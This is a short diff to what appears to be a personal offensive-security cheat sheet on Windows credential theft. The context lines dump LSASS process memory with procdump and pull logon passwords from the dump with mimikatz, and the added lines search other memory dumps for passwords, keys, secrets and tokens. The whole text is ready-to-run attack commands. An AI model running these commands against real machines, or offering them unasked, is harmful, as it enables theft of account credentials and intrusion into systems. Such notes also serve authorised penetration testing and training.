@@ -38,3 +38,6 @@ procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 mimikatz.exe
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonPasswords full
+
+#other .dmp files
+strings <file>.dmp | grep -iE "auth|login|pass|key|secret|token" #i ignore case, E regex for auth OR login etc
